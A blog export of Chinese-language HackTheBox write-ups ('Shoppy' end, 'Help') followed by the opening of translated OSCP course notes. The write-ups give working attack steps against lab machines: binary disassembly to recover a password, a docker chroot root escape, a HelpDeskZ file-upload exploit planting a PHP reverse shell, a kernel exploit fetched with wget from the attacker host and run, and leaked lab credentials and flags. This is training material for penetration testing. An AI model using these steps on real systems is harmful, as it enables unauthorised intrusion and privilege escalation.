std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \n│           0x000012d0      488d45a0       lea rax, [var_60h]\n│           0x000012d4      488d35880d00.  lea rsi, [0x00002063]       ; u\"ple\"\n│           0x000012db      4889c7         mov rdi, rax\n│           0x000012de      e88dfdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \n│           0x000012e3      488d45a0       lea rax, [var_60h]\n│           0x000012e7      488d35770d00.  lea rsi, [0x00002065]       ; u\"le\"\n│           0x000012ee      4889c7         mov rdi, rax\n│           0x000012f1      e87afdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \n│           0x000012f6      488d45a0       lea rax, [var_60h]\n│           0x000012fa      488d35660d00.  lea rsi, [0x00002067]       ; \"e\"\n│           0x00001301      4889c7         mov rdi, rax\n│           0x00001304      e867fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \n│           0x00001309      488d55a0       lea rdx, [var_60h]\n│           0x0000130d      488d45c0       lea rax, [var_40h]\n│           0x00001311      4889d6         mov rsi, rdx\n│           0x00001314      4889c7         mov rdi, rax\n│           0x00001317      e814fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::compare(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) const ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::compare_std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____const__const                                                                                                                                                                                                               \n│           0x0000131c      85c0           test eax, eax\n│           0x0000131e      0f94c0         sete al\n│           0x00001321      84c0           test al, al\n│       ┌─< 0x00001323      743b           je 0x1360\n│       │   0x00001325      488d35440d00.  lea rsi, str.Access_granted__Here_is_creds__ ; 0x2070 ; \"Access granted! Here is creds !\"\n│       │   0x0000132c      488d3d8d2d00.  lea rdi, obj.std::cout      ; sym..bss\n│       │                                                              ; 0x40c0                                                                                                                                    \n│       │   0x00001333      e848fdffff     call sym std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_                                                \n│       │   0x00001338      4889c2         mov rdx, rax\n│       │   0x0000133b      488b058e2c00.  mov rax, qword [method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____] ; [0x3fd0:8]=0                                                                                                                                                                                                        \n│       │   0x00001342      4889c6         mov rsi, rax\n│       │   0x00001345      4889d7         mov rdi, rdx\n│       │   0x00001348      e843fdffff     call sym std::ostream::operator<<(std::ostream& (*)(std::ostream&)) ; sym.imp.std::ostream::operator___std::ostream____std::ostream__\n│       │   0x0000134d      488d3d3c0d00.  lea rdi, str.cat__home_deploy_creds.txt ; 0x2090 ; \"cat /home/deploy/creds.txt\" ; const char *string\n│       │   0x00001354      e8f7fcffff     call sym.imp.system         ; int system(const char *string)\n│       │   0x00001359      bb00000000     mov ebx, 0\n│      ┌──< 0x0000135e      eb2d           jmp 0x138d\n│      ││   ; CODE XREF from main @ 0x1323\n│      │└─> 0x00001360      488d35490d00.  lea rsi, str.Access_denied__This_incident_will_be_reported__ ; 0x20b0 ; \"Access denied! This incident will be reported !\"\n│      │    0x00001367      488d3d522d00.  lea rdi, obj.std::cout      ; sym..bss\n│      │                                                               ; 0x40c0                                                                                                                                    \n│      │    0x0000136e      e80dfdffff     call sym std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_                                                \n│      │    0x00001373      4889c2         mov rdx, rax\n│      │    0x00001376      488b05532c00.  mov rax, qword [method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____] ; [0x3fd0:8]=0                                                                                                                                                                                                        \n│      │    0x0000137d      4889c6         mov rsi, rax\n│      │    0x00001380      4889d7         mov rdi, rdx\n│      │    0x00001383      e808fdffff     call sym std::ostream::operator<<(std::ostream& (*)(std::ostream&)) ; sym.imp.std::ostream::operator___std::ostream____std::ostream__\n│      │    0x00001388      bb01000000     mov ebx, 1\n│      │    ; CODE XREF from main @ 0x135e\n│      └──> 0x0000138d      488d45a0       lea rax, [var_60h]\n│           0x00001391      4889c7         mov rdi, rax\n│           0x00001394      e8a7fcffff     call fcn.00001040\n│           0x00001399      488d45c0       lea rax, [var_40h]\n│           0x0000139d      4889c7         mov rdi, rax\n│           0x000013a0      e89bfcffff     call fcn.00001040\n│           0x000013a5      89d8           mov eax, ebx\n│       ┌─< 0x000013a7      eb3c           jmp 0x13e5\n..\n      │││   ; CODE XREFS from main @ +0x1b3, +0x1c4\n│       │   ; CODE XREF from main @ 0x13a7\n│       └─> 0x000013e5      488b5df8       mov rbx, qword [var_8h]\n│           0x000013e9      c9             leave\n└           0x000013ea      c3             ret\n```\n使用函数 `s main` 定位到 main 函数的地址，使用函数 `pdf` 查看当前函数的汇编代码\n\n```bash\n0x0000120e      488d35fb0d00.  lea rsi, str.Welcome_to_Josh_password_manager_ ; 0x2010 ; \"Welcome to Josh password manager!\"\n```\n这是一个 c++ 写的程序，运行程序之后会输出 \"Welcome to Josh password manager!\" 字符串\n\n```bash\n0x00001236      488d35fb0d00.  lea rsi, str.Please_enter_your_master_password:_ ; 0x2038 ; \"Please enter your master password: \"\n```\n然后输出 \"Please enter your master password: \" 字符串，并接受我们的输入\n\n```bash\n│           0x0000129b      488d35bb0d00.  lea rsi, str.Sample         ; 0x205d ; u\"Sample\"\n│           0x000012a2      4889c7         mov rdi, rax\n│           0x000012a5      e8c6fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \n│           0x000012aa      488d45a0       lea rax, [var_60h]\n│           0x000012ae      488d35aa0d00.  lea rsi, [0x0000205f]       ; u\"ample\"\n│           0x000012b5      4889c7         mov rdi, rax\n│           0x000012b8      e8b3fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \n│           0x000012bd      488d45a0       lea rax, [var_60h]\n│           0x000012c1      488d35990d00.  lea rsi, [0x00002061]       ; u\"mple\"\n│           0x000012c8      4889c7         mov rdi, rax\n│           0x000012cb      e8a0fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \n│           0x000012d0      488d45a0       lea rax, [var_60h]\n│           0x000012d4      488d35880d00.  lea rsi, [0x00002063]       ; u\"ple\"\n│           0x000012db      4889c7         mov rdi, rax\n│           0x000012de      e88dfdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \n│           0x000012e3      488d45a0       lea rax, [var_60h]\n│           0x000012e7      488d35770d00.  lea rsi, [0x00002065]       ; u\"le\"\n│           0x000012ee      4889c7         mov rdi, rax\n│           0x000012f1      e87afdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \n│           0x000012f6      488d45a0       lea rax, [var_60h]\n│           0x000012fa      488d35660d00.  lea rsi, [0x00002067]       ; \"e\"\n│           0x00001301      4889c7         mov rdi, rax\n│           0x00001304      e867fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_\n```\n接着，程序会和我们输入的字符串和 Sample 字符一个一个的做对比\n\n```bash\n0x00001325      488d35440d00.  lea rsi, str.Access_granted__Here_is_creds__ ; 0x2070 ; \"Access granted! Here is creds !\"\n0x0000134d      488d3d3c0d00.  lea rdi, str.cat__home_deploy_creds.txt ; 0x2090 ; \"cat /home/deploy/creds.txt\" ; const char *string\n```\n我们输入的字符串是 Sample 后，会输出 \"Access granted! Here is creds !\" 字符串，表示我们输入正确，然后会执行一个系统命令 \"cat /home/deploy/creds.txt\"，查看文件 /home/deploy/creds.txt 的内容。\n\n现在我们回到靶机，来执行一下\n\n```bash\njaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager\n[sudo] password for jaeger: \nWelcome to Josh password manager!\nPlease enter your master password: Sample\nAccess granted! Here is creds !\nDeploy Creds :\nusername: deploy\npassword: Deploying@pp!\n```\n得到了一个账号密码，然后使用这个账号密码切换到用户 deploy\n\n```bash\njaeger@shoppy:/home/deploy$ su deploy\nPassword: \n$ whoami&&id\ndeploy\nuid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)\n```\n成功提权到 deploy 用户\n\n## Docker 越权\n> [https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)\n\n> 查询提权帮助\n\n![image](Hackthebox-Shoppy/8bG08PtQP0JeDHKrF9xon1QswWhY2CQlAiZuN0OKAzA.png)\n\n我们尝试一下是否可行\n\n```bash\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n```\n```bash\n$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh  \n# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)\n```\n成功越权到 root 权限\n\n```bash\n# cat /root/root.txt\ne95c041905b2bb2a8fcbb6d9327e9d64\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Help - Hackthebox","url":"/2022/09/05/Hackthebox/Easy/Hackthebox-Help/","content":"\n# Hackthebox - Help\n# 靶场信息\n![](Hackthebox-Help/cf4c49c4-a97c-44da-b0fc-1a3d55516bbb.png)\n\n# 靶场类型\n![](Hackthebox-Help/bf387b14-d774-411a-802a-c102eed009f2.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.121\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 09:14 CST\nNmap scan report for 10.10.10.121\nHost is up (0.35s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)\n|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)\n|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.18\n|_http-title: Did not follow redirect to http://help.htb/\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n3000/tcp open  http    Node.js Express framework\n|_http-title: Site doesn't have a title (application/json; charset=utf-8).\nAggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), DD-WRT (Linux 3.18) (93%), Linux 4.10 (93%), Linux 4.2 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1720/tcp)\nHOP RTT       ADDRESS\n1   349.63 ms 10.10.14.1\n2   349.25 ms 10.10.10.121\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 55.59 seconds\n```\n## Http\n![](Hackthebox-Help/f9f452a5-ebd8-49dd-abeb-ed67d289194e.png)\n\n直接访问会被跳转到 htlp.htb 去加一个 hosts\n\n```bash\necho 10.10.10.121 help.htb >> /etc/hosts\n```\n![](Hackthebox-Help/75a9bf99-347f-4667-9efd-dbaea725dd1f.png)\n\n现在可以访问了，不过是 apache2 的默认界面，去 fuzz 一下\n\n### Fuzz\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# gobuster dir -u http://help.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 --no-error\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://help.htb/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/09/04 20:36:06 Starting gobuster in directory enumeration mode\n===============================================================\n/javascript           (Status: 301) [Size: 309] [--> http://help.htb/javascript/]\n/support              (Status: 301) [Size: 306] [--> http://help.htb/support/]   \n/server-status        (Status: 403) [Size: 296]                                  \n\n===============================================================\n2022/09/04 20:37:41 Finished\n===============================================================\n```\n有一个 support 目录，访问一下\n\n![](Hackthebox-Help/53d8d61c-ec33-4116-ab6f-ee458b65615b.png)\n\n是一个登录页面，并且可以确定框架为 helpdeskz\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# searchsploit helpdeskz \n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                                            |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nHelpDeskZ 1.0.2 - Arbitrary File Upload                                                                                                                                                                   | php/webapps/40300.py\nHelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download                                                                                                                            | php/webapps/41200.py\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\n可以看到有两个漏洞，分别是 1.0.2 版本的任意文件上传以及 1.0.2 版本以下的 sql 注入，但是我们无法确定当前 cms 的版本号\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# curl http://help.htb/support/README.md\n![](Hackthebox-Help//images/logo.png)\n\nVersion: 1.0.2 from 1st June 2015<br>\nDeveloped by: Evolution Script S.A.C.<br>\n[Help Desk Software HelpDeskZ](http://www.helpdeskz.com)\n\nHelpDeskZ is a free PHP based software which allows you to manage your site's support with a web-based support ticket system.\n\n## Requirements\n\nHelpDeskZ requires:\n\n- PHP 5.x\n- MySQL database\n- GD Library (only for captcha verification)\n- Mod_rewrite (only if you want to use permalinks)-\n\n## Upgrading\n\nTo upgrade your HelpDeskZ from previous versions, please read the file UPGRADING.txt\n\n## Installation steps\n\n- Connect with FTP to the <em>public folder</em> of your server where the rest of your Web site is\n- Create a new folder where you will install HelpDeskZ. Name it anything you like, for example \"helpdesk\" or \"support\".<br>\nExample: /public_html/support<br>\nCorresponding URL: http://www.site.com/support\n- Upload all HelpDeskZ files to your server.\n- Open **/install** in your browser, for example (modify to your URL):<br />\nhttp://www.site.com/support/install\n- The HelpDeskZ setup script will run. Click <strong>INSTALL HELPDESKZ</strong> and follow the instructions through License agreement, Check Setup and Database settings.\n- Before closing the install script **DELETE the \"install\" directory from your server!**\n- Now it's time to setup your help desk! Open the <strong>staff</strong> panel in your browser, for example:<br />\nhttp://www.site.com/support/?v=staff<br />\nUse the login details that you entered in the installation process.\n- Go to <strong>Settings -> General</strong> to get to the settings page.\n- Take some time and get familiar with all of the available settings. Most of them should be self-explanatory.\n- If you want to use permalinks like http://www.site.com/support/staff/ then you have to enable this option on Settings -> General -> Helpdesk -> Use SEO-friendly URLs\n- Good luck using HelpDeskZ!\n- \n## Email Piping\nHelpDeskZ supports email piping, this allows the auto-creation of tickets from incoming emails to a set email address.\n- To enable email piping for your help desk follow this <a href=\"http://www.helpdeskz.com/help/knowledgebase/2/article/10/setting-up-email-piping\">email piping tutorial.</a>\n\n## Customize the look\nFor detailed information please see this <a href=\"http://www.helpdeskz.com/help/knowledgebase/2/article/6/how-do-i-customize-helpdeskz-look\">knowledgebase article.</a>\n\n## Translate HelpDeskZ to your language\nTo translate HelpDeskZ read <a href=\"http://www.helpdeskz.com/help/knowledgebase/2/article/8/how-can-i-translate-helpdeskz\">How can I translate HelpDeskZ.</a>\n```\n通过 README.md 得知当前版本为 1.0.2\n\n根据漏洞，当前应该是可以直接进行 sql 注入尝试的，不过咱们再看看更多思路\n\n## 3000 端口\n![](Hackthebox-Help/be2f7cf8-3462-4877-a5b9-c6b006fe0920.png)\n\n这边有个 3000 端口可以访问\n\n```bash\n\"Hi Shiv, To get access please find the credentials with given query\"\n```\n这提示我们，想要获得权限，需要通过给定的查询找到答案\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# dirsearch -u \"http://10.10.10.121:3000\"       \n\n  _|. _ _  _  _  _ _|_    v0.4.2\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927\n\nOutput File: /root/.dirsearch/reports/10.10.10.121-3000/_22-07-01_09-29-39.txt\n\nError Log: /root/.dirsearch/logs/errors-22-07-01_09-29-39.log\n\nTarget: http://10.10.10.121:3000/\n\n[09:29:40] Starting: \n[09:33:40] 400 -   18B  - /graphql/                                         \n[09:33:40] 400 -   18B  - /graphql/console/\n[09:33:40] 400 -   18B  - /graphql                                          \n\nTask Completed\n```\n找到了一个 /graphql 目录，这个目录下还有一个 /console 目录，去访问一下\n\n![](Hackthebox-Help/6995cd39-bb36-4b5b-a7c2-52c5f29af255.png)\n\n这边提示需要一个 get 参数 query\n\n![](Hackthebox-Help/7bf17396-814b-4c47-84d2-cc3ea7ab1fdc.png)\n\n随便加一个参数后倒是出来数据了，但是提示语法错误，去找一下query相关的功能\n\n![](Hackthebox-Help/2324c19f-f59c-485b-9127-eee4817e4073.png)\n\n找到相关的利用方式，然后读取到了一个账号密码\n\n# 漏洞利用\n![](Hackthebox-Help/eee7ea28-ca2f-4d5a-ae47-b7dfae60f84a.png)\n\n得到解密后的账号密码\n\n```bash\nusername = helpme@helpme.com\npassword = godhelpmeplz\n```\n![](Hackthebox-Help/582b25b2-d598-4188-abcd-77f4ffc8ac27.png)\n\n在 80 端口成功登录\n\n![](Hackthebox-Help/6959207b-6185-4551-a699-deb49f023f59.png)\n\n把时区修改为我们当前环境的时区\n\n![](Hackthebox-Help/ec95c9d8-0112-4cf7-844f-7037ad2f886e.png)\n\n在 Submit a Ticket 中尝试上传一个 php 文件\n\n![](Hackthebox-Help/8f647a18-4501-4874-b67c-ad9af62da5e5.png)\n\n这里提示上传失败，但是其实是成功的，不过会被修改为随机文件名，找到就可以了，所以我们还是去利用脚本吧\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# python2 40300.py http://help.htb/support/uploads/tickets/ 1.php\nHelpdeskz v1.0.2 - Unauthenticated shell upload exploit\nfound!\nhttp://help.htb/support/uploads/tickets/9d831815c3faa6a961d01bd9dc543aca.php\n```\n上传成功，去尝试访问看看\n\n![](Hackthebox-Help/dfb3d676-97cc-4c82-96fa-fe07fc4cef6a.png)\n\n成功上传并且访问成功，去制作一个 php 的 revershell\n\n> [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)\n\n然后去网页端上传，接着使用 nc 监听一个端口，然后运行 exploit\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# python2 40300.py http://help.htb/support/uploads/tickets/ phpshell.php\nHelpdeskz v1.0.2 - Unauthenticated shell upload exploit\n```\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.9] from (UNKNOWN) [10.10.10.121] 35558\nLinux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n 19:41:30 up 1 day,  9:53,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)\n/bin/sh: 0: can't access tty; job control turned off\n$ python -c \"import pty;pty.spawn('/bin/bash')\";\nhelp@help:/$ id&&whoami\nid&&whoami\nuid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)\nhelp\n```\n成功弹回 shel\n\n```bash\ncat user.txt\n64cf57c35b4e6991534e125790ad0b55\n```\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n首先使用 python 开启一个 http 服务器，然后上传一个 linpeas 提权辅助脚本\n\n```bash\n                                                                                 ╔═══════════════════╗\n═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════                                                                                                                                     \n                                         ╚═══════════════════╝                                                                                                                                                                              \nOS: Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018\nUser & Groups: uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)\nHostname: help\nWritable folder: /dev/shm\n[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)\n[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                               \n\n\nCaching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE\n```\n这边看到了系统版本是 ubuntu 4.40，去搜索下是否有漏洞\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# searchsploit 4.4.0-116\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                                            |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nLinux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                                                                    | linux/local/44298.c\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\n找到一个 传到服务器去，然后编译运行\n\n```bash\nhelp@help:/tmp$ wget http://10.10.14.9/44298.c\nwget http://10.10.14.9/44298.c\n--2022-09-04 20:40:43--  http://10.10.14.9/44298.c\nConnecting to 10.10.14.9:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 5773 (5.6K) [text/x-csrc]\nSaving to: '44298.c'\n\n44298.c             100%[===================>]   5.64K  --.-KB/s    in 0s      \n\n2022-09-04 20:40:43 (20.3 MB/s) - '44298.c' saved [5773/5773]\n```\n传输进来以后，去进行编译\n\n```bash\nhelp@help:/tmp$ gcc 44298.c -o exploit \ngcc 44298.c -o exploit\n```\n接着运行\n\n```bash\nhelp@help:/tmp$ ./exploit\n./exploit\ntask_struct = ffff880037ee8000\nuidptr = ffff880036f91084\nspawning root shell\nroot@help:/tmp# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)\n```\n```bash\nroot@help:/root# cat root.txt\ncat root.txt\n9123b571740b6f2c3b1a7fa657c55f20\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"OSCP随笔","url":"/2022/08/06/OSCP/OSCP随笔/","content":"\n# OSCP - PWK\n\n------\n\n# 使用Kali Linux进行渗透测试:一般课程信息\n\n欢迎来到 Kali Linux 的渗透测试(PWK)课程!\n\nPWK 是为那些想在专业渗透测试领域迈出严肃而有意义的一步的系统和网络管理员以及安全专家而设立的。本课程将帮助你更好地了解恶意实体对网络的攻击和技术。恭喜你迈出了第一步。我们很高兴你在这里。\n\n## 关于 PWK 课程\n\n让我们花点时间来回顾一下课程本身和它的每一个组成部分。你现在应该可以访问以下内容：\n\n- PWK课程材料\n- 接入内部VPN实验室网络\n- Offensive Security 学生论坛\n- 实时支持\n- OSCP考试的尝试\n\n让我们逐一回顾这些项目。\n\n### PWK 课程材料\n\n该课程包括PDF格式的实验指南和配套的课程视频。PDF和视频中涵盖的信息是重叠的，这意味着你可以先阅读实验指南，然后观看视频来填补任何空白，反之亦然。在某些模块中，实验指南比视频更详细。在其他情况下，视频可能比指南更能传达一些信息。重要的是，你要密切注意这两方面的内容。\n\n实验指南在每一章的末尾还包含练习。 完成课程练习将帮助你在尝试发现和利用实验室机器中的漏洞时变得更有效率。\n\n### 接入内部 VPN 实验室网络\n\n你在开课日收到的电子邮件欢迎包中包括你的VPN证书和相应的VPN连接包。这些将使您能够访问内部VPN实验室网络，您将在那里花费大量的时间。\n\n实验时间从您的课程开始时开始，并以连续访问的方式计量。实验室时间只有在紧急情况下才可以暂停。$^1$\n\n如果你的实验时间过期或即将过期，你可以在任何时候购买实验延期。要购买额外的实验室时间，请使用发送到你的电子邮件地址的个性化购买链接。如果你在实验室访问仍然有效时购买实验室延期，你可以继续使用相同的VPN连接包。 如果你在现有的实验室访问结束后购买实验室延期，你将收到一个新的VPN连接包。\n\n### Offensive Security 学生论坛\n\n学生论坛$^2$只有 Offensive Security 专业的学生才能进入。你的论坛凭证也是电子邮件欢迎包的一部分。访问权不会因为你的实验时间结束而过期。在你通过OSCP考试后，你可以继续享受论坛。\n\n在论坛上，你可以提出问题，分享有趣的资源，并提供提示（只要没有破坏性的内容）。我们要求所有的论坛成员注意他们所发布的内容，特别注意不要因为发布完整的解决方案而破坏他人的整体课程体验。不周到的帖子可能会被审核。\n\n除了来自其他学生的帖子外，你还会发现一些额外的资源，可以帮助澄清课程中提出的概念。 这些资源包括实验室机器子集的详细演练。 这些演练的目的是说明实现最佳结果所需的思维方式和方法。\n\n一旦你成功通过 OSCP 考试，你将获得进入证书持有者分论坛的权限。\n\n### 实时支持\n\n实时支持$^3$将使您能够直接与我们的学生管理员沟通。这些是参加过PWK课程并通过OSCP认证考试的 Offensive Security 的工作人员。\n\n学生管理员可以帮助解决技术问题，但他们也可以澄清教材和练习中的项目。此外，如果你已经尽力了，但在实验机上完全卡住了，学生管理员可能会提供一个小提示来帮助你前进。\n\n记住，学生管理员提供的信息将基于你能够提供的细节数量。你能提供的关于你已经尝试过的东西和你能够观察到的结果的细节越多越好。\n\n### OSCP 考试机会\n\n在你初次购买 PWK 课程时，包括一次 OSCP 认证考试$^4$的尝试。该考试是可选的，所以由你自己决定是否要参加考试。在你的实验时间结束后，你有 120 天时间来安排和完成你的考试尝试。120 天后，尝试将过期。\n\n如果你的考试尝试过期，你可以再购买一次，并在购买日期的120天内参加考试。\n\n如果你在仍有未使用的考试尝试时购买了实验室延期，你的考试尝试的到期日将被移至实验室延期结束后的120天。要预定你的OSCP考试，请使用你的个人化考试安排链接。这个链接包括在欢迎包的电子邮件中。\n\n你也可以使用你的PWK控制面板找到这个链接。\n\n## 接近课程的总体策略\n\n每个学生都是独一无二的，所以没有一个绝对最好的方法来处理这个课程和材料。我们希望鼓励你以你自己舒适的速度完成课程。你还需要运用时间管理技巧来保持自己的进度。\n\n我们建议将以下内容作为课程材料的一个非常普遍的方法：\n\n1. 复习包括在欢迎和课程信息电子邮件中的所有信息。\n2. 复习一下课程材料。\n3. 完成所有的课程练习。\n4. 完成所有的课程练习。\n\n### 欢迎和课程信息电子邮件\n\n首先，也是最重要的，花时间阅读你在课程开始日收到的电子邮件中包含的所有信息。这些电子邮件包括诸如您的VPN包、实验室和论坛证书以及控制面板的URL。 它们还包括课程常见问题解答、特别有用的论坛主题和支持页面的URL。\n\n### 课程材料\n\n一旦你回顾了上述信息，你就可以进入课程材料。你可以选择从课程视频开始，然后在实验指南中复习该模块的信息，或者反之亦然，这取决于你喜欢的学习方式。当你通过课程材料时，你可能需要重新观看或重新阅读模块以完全掌握内容。\n\n我们建议把这个课程当作马拉松，而不是冲刺。在推进课程之前，不要害怕在困难的概念上多花时间。\n\n### 课程练习\n\n我们建议你在进入下一个模块之前，完全完成每个模块末尾的练习。它们将测试你对材料的理解，并建立你前进的信心。\n\n完成这些练习所需的时间和精力可能取决于你现有的技能。请注意，有些练习是困难的，可能需要大量的时间。我们希望鼓励你持之以恒，尤其是对较难的练习。它们对培养Offsec的 \"努力尝试 \"的心态特别有帮助。\n\n### PWK 